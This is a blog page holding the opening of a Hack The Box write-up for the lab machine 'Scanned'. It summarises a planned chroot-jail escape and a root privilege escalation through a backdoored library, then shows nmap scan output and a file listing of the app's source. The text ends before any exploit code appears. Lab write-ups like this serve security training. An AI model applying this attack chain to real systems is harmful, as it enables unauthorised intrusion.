<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Scanned" />
<meta property="og:locale" content="en" />
<meta name="description" content="Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reused credentials. To obtain root we will again fiddle with the chroot jail binary to call a suid binary using a backdored library and thus getting code execution as the root user." />
<meta property="og:description" content="Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reused credentials. To obtain root we will again fiddle with the chroot jail binary to call a suid binary using a backdored library and thus getting code execution as the root user." />
<link rel="canonical" href="http://localhost:4000/posts/scanned/" />
<meta property="og:url" content="http://localhost:4000/posts/scanned/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/img/scanned/000_info_card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-09-10T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/img/scanned/000_info_card.png" />
<meta property="twitter:title" content="Hack The Box - Scanned" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-10T00:00:00+08:00","datePublished":"2022-09-10T00:00:00+08:00","description":"Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reused credentials. To obtain root we will again fiddle with the chroot jail binary to call a suid binary using a backdored library and thus getting code execution as the root user.","headline":"Hack The Box - Scanned","image":"http://localhost:4000/img/scanned/000_info_card.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/scanned/"},"url":"http://localhost:4000/posts/scanned/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Scanned | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">ğ„ğ­ğ¡ğ¢ğœğšğ¥ ğ‡ğšğœğ¤ğğ« || ğ’ğ¨ğŸğ­ğ°ğšğ«ğ ğ„ğ§ğ ğ¢ğ§ğğğ« || ğ‚ğ²ğ›ğğ« ğ’ğğœğ®ğ«ğ¢ğ­ğ² ğ‘ğğ¬ğšğ«ğœğ¡ğğ«.!! ğğ’ğ‚ğ & ğğ’ğ„ğ.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - Scanned</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Scanned</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1662739200"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Sep 10, 2022
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/img/scanned/000_info_card.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="5347 words">
  <em>29 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Scanned is an insane rated machine on HackTheBox created by <a href="https://www.hackthebox.com/home/users/profile/83743">clubby789</a>. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reused credentials. To obtain root we will again fiddle with the chroot jail binary to call a suid binary using a backdored library and thus getting code execution as the root user.</p>

<h1 id="user">User</h1>

<p>As usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.</p>

<p><code class="language-plaintext highlighter-rouge">All Ports</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">T4</span> <span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">159</span><span class="p">.</span><span class="mi">163</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mi">7</span><span class="p">.</span><span class="mi">92</span> <span class="p">(</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org ) at 2022-01-31 18:34 CET</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">159</span><span class="p">.</span><span class="mi">163</span>
<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mo">034</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="n">Not</span> <span class="n">shown</span><span class="o">:</span> <span class="mi">65533</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="o">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mi">100</span><span class="p">.</span><span class="mi">45</span> <span class="n">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">Script and version</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="o">-</span><span class="n">n</span> <span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">159</span><span class="p">.</span><span class="mi">163</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mi">7</span><span class="p">.</span><span class="mi">92</span> <span class="p">(</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org ) at 2022-01-31 18:38 CET</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">159</span><span class="p">.</span><span class="mi">163</span>
<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mo">034</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span> <span class="p">(</span><span class="n">protocol</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span>
<span class="o">|</span>   <span class="mi">3072</span> <span class="mi">6</span><span class="n">a</span><span class="o">:</span><span class="mi">7</span><span class="n">b</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="mi">68</span><span class="o">:</span><span class="mi">97</span><span class="o">:</span><span class="mo">01</span><span class="o">:</span><span class="mi">4</span><span class="n">a</span><span class="o">:</span><span class="mi">08</span><span class="o">:</span><span class="mi">6</span><span class="n">a</span><span class="o">:</span><span class="n">e1</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="n">b1</span><span class="o">:</span><span class="n">d2</span><span class="o">:</span><span class="n">bd</span><span class="o">:</span><span class="mi">8</span><span class="n">f</span><span class="o">:</span><span class="mi">3</span><span class="n">f</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="n">f6</span><span class="o">:</span><span class="n">b4</span><span class="o">:</span><span class="n">e1</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="n">f0</span><span class="o">:</span><span class="mi">7</span><span class="n">b</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">48</span><span class="o">:</span><span class="mi">66</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="n">c2</span><span class="o">:</span><span class="n">c6</span><span class="o">:</span><span class="mi">28</span><span class="o">:</span><span class="n">ff</span><span class="o">:</span><span class="n">b8</span><span class="o">:</span><span class="mi">25</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">c9</span><span class="o">:</span><span class="mi">8</span><span class="n">b</span><span class="o">:</span><span class="mi">96</span><span class="o">:</span><span class="mi">19</span><span class="o">:</span><span class="mi">51</span><span class="o">:</span><span class="n">e7</span><span class="o">:</span><span class="n">ce</span><span class="o">:</span><span class="mi">1</span><span class="n">f</span><span class="o">:</span><span class="mi">7</span><span class="n">d</span><span class="o">:</span><span class="mi">3</span><span class="n">e</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="n">e9</span><span class="o">:</span><span class="n">a4</span><span class="o">:</span><span class="mo">04</span><span class="o">:</span><span class="mi">91</span><span class="o">:</span><span class="mi">09</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="n">Malware</span> <span class="n">Scanner</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">18</span><span class="p">.</span><span class="mi">0</span>
<span class="n">Service</span> <span class="n">Info</span><span class="o">:</span> <span class="n">OS</span><span class="o">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="o">:</span> <span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="o">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="o">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mi">8</span><span class="p">.</span><span class="mo">00</span> <span class="n">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<p>There are only two ports open on the machine with nginx running on port 80 seeming most promising for initial access. Opening the page in our browser we see an application that offers to scan malware in a chroot jail.</p>

<p><a href="/img/scanned/005_MalScanner_home.png"><img data-src="/img/scanned/005_MalScanner_home.png" alt="005_MalScanner_home" data-proofer-ignore></a></p>

<p>The first link on the page <code class="language-plaintext highlighter-rouge">http://10.129.159.163/scanner/upload</code> leads to the upload form where we can submit a binary for scanning.</p>

<p><a href="/img/scanned/010_MalScanner_upload.png"><img data-src="/img/scanned/010_MalScanner_upload.png" alt="010_MalScanner_upload" data-proofer-ignore></a></p>

<p>The other link <code class="language-plaintext highlighter-rouge">http://10.129.159.163/static/source.tar.gz</code> letâ€™s us download a source tar archive.
The archive looks interesting so letâ€™s download and unpack it.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">tar</span> <span class="o">-</span><span class="n">xvf</span> <span class="n">source</span><span class="mf">.</span><span class="n">tar</span><span class="mf">.</span><span class="n">gz</span>
<span class="n">malscanner</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/.</span><span class="n">gitignore</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="mf">.</span><span class="n">db</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__init__</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="nb">__init__</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">settings</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">urls</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">views</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">wsgi</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="n">asgi</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="n">settings</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="n">urls</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="n">views</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">malscanner</span><span class="o">/</span><span class="n">wsgi</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">manage</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">requirements</span><span class="mf">.</span><span class="n">txt</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">sandbox</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">sandbox</span><span class="o">/</span><span class="n">jails</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">sandbox</span><span class="o">/</span><span class="n">sandbox</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="nb">__init__</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="nb">__init__</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">forms</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">urls</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">views</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">admin</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">apps</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">forms</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">tests</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">urls</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">views</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="k">static</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="k">static</span><span class="o">/</span><span class="n">source</span><span class="mf">.</span><span class="n">tar</span><span class="mf">.</span><span class="n">gz</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">html</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">upload</span><span class="mf">.</span><span class="n">html</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">view</span><span class="mf">.</span><span class="n">html</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">uwsgi_params</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="nb">__init__</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="nb">__init__</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">syscalls</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
